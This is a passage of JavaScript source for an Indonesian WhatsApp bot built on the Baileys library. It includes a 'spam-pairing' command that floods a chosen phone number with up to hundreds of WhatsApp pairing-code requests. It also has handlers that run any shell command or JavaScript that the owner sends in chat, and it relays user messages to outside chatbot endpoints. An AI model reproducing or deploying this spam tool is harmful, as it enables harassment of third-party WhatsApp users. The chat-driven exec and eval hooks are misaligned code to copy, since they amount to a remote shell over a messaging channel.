        m.reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ *\`asumaa\`* : ɴᴏɴᴀᴋᴛɪғ [ √ ]`);
    }
};
break
case 'spam-pairing': {
if (!isOwner) return reply(mesg.owner)
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply(msg.wait)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break

default:
/**
*
*`[ Respon Sticker ]`
*
**/
if ((budy.match) && ["kak", "woy", "mek", "jawir", "y", "dah", "yaudah", "bang", "bg", "Bang", "Bg", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
var stik = await fetchJson('https://raw.githubusercontent.com/tanakasenn/Database-Json/refs/heads/main/StickerRespon.json')
var pick = pickRandom(stik)
cay.sendImageAsSticker(m.chat, pick, m, { packname: global.namabot, author: global.namaowner })
}

cay.CAI = cay.CAI ? cay.CAI : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!cay.CAI[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (cay.CAI[sender] && m.text) {
        let name = cay.getName(sender);
        //await cay.sendMessage(m.chat, { react: { text: `🤔`, key: m.key }});

        try {
            const C = require('node-fetch')
            const spychat2 = body.replace().slice().trim()
            const V = await C("https://cih-cai-jir.koi.pics/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat2));
            const L = await V.json();
            const answer = L.reply;
            m.reply(answer)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("gatau aku lagi error.");
        }
    }
//autoai 2
cay.asuma = cay.asuma ? cay.asuma : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!cay.asuma[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (cay.asuma[sender] && m.text) {
        let name = cay.getName(sender);
        //await cay.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        try {
            const C1 = require('node-fetch')
            const spychat22 = body.replace().slice().trim()
            const V1 = await C1("https://cai.neekoi.me/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat22));
            const L1 = await V1.json();
            const answer1 = L1.reply;
            m.reply(answer1)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("gatauu.");
        }
    }
cay.menfess = cay.menfess ? cay.menfess : {}
         let mf = Object.values(cay.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
            if (!/conversation|extended/.test(m.mtype)) return reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await cay.sendMessage(mf.from, { text: text }).then(async () => {
               reply(`Berhasil Terkirim!!`)
               await sleep(1000)
               delete cay.menfess[mf.id]
               return !0
            })
         }     

if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return cay.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return cay.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
cay.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
cay.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return cay.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return cay.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}
/*
}} catch (e) {
console.log(e)
}}*/
}} catch (e) {
console.log(e)
cay.sendMessage(`6287875411618@s.whatsapp.net`, {text:`*ERROR:*   \`</>${e.message}</>\`
`}, {quoted: m})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})